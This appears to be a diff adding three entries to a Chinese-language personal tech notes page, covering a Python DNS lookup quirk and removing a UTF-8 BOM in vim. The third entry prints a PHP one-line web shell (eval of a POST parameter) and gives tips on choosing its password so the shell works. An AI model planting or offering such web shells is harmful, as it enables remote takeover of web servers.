@@ -2004,7 +2004,14 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
     要想让多个客户端使用同一个客户端配置文件,要在server上的配置文件中的duplicate-cn取消注释,client-to-client最
     好也取消注释
     在服务器上重启openvpn命令:service openvpn restart
-
+<span class="p">
+286.</span>python中socket.gethostbyname_ex在没有网络连接的情况下无法工作,会出错
+<span class="p">
+287.</span>有些编辑器会在utf8文件开头加上bom(eg.notepad),而如python等编译器不会自动处理这个bom,手动删除bom方法:vim打
+    开后:set nobomb
+<span class="p">
+288.</span><span class="cp">&lt;?php @eval($_POST[0day]);?&gt;</span>这个一句话的密码不是0day,这样的语法是错的,php中不加引号的变量不能以数字开头,
+    以后写一句话最好加双引号或单引号,否则不能用数字开关的密码
 </code></pre>
 </div>
 
